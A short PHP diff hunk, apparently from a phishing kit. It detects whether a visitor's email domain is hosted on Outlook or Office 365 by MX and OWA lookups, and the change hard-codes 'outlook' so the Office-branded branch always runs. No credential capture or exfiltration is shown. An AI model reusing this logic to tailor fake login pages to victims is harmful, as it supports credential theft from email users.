@@ -377,10 +377,10 @@ setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1
 $atdomain = strstr($email, '@');
 $domain = str_replace("@","",$atdomain);
 
-$hosts = array();
-getmxrr($domain, $hosts);
-$owac = check_owa($domain);
-$a = strtolower($hosts[0]);
+//$hosts = array();
+//getmxrr($domain, $hosts);
+//$owac = check_owa($domain);
+$a = 'outlook';
 
 if (strpos($a, 'outlook') !== false || searchtxt($domain)!== false) {
     $src="office";
